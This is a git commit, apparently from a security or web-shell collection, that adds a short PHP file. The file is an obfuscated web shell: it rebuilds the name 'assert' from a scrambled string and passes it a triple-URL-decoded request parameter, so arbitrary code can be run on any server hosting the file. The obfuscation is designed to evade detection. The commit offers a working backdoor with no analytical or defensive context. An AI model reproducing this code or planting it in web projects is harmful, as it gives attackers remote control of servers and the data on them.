0e0546ceacdc9a1e0fb19991cdce44a95d67cf5d
safe6Sec <1850597152@qq.com>
2021-10-08 18:01:23 +0800

    Create 11.php

---
+++ 11.php
@@ -0,0 +1,6 @@
+<?php
+$poc ="axsxsxexrxt";
+$poc_1 = explode("x", $poc);
+$poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3]. $poc_1[4]. $poc_1[5];
+$poc_2(urldecode(urldecode(urldecode($_REQUEST[x]))));
+?>
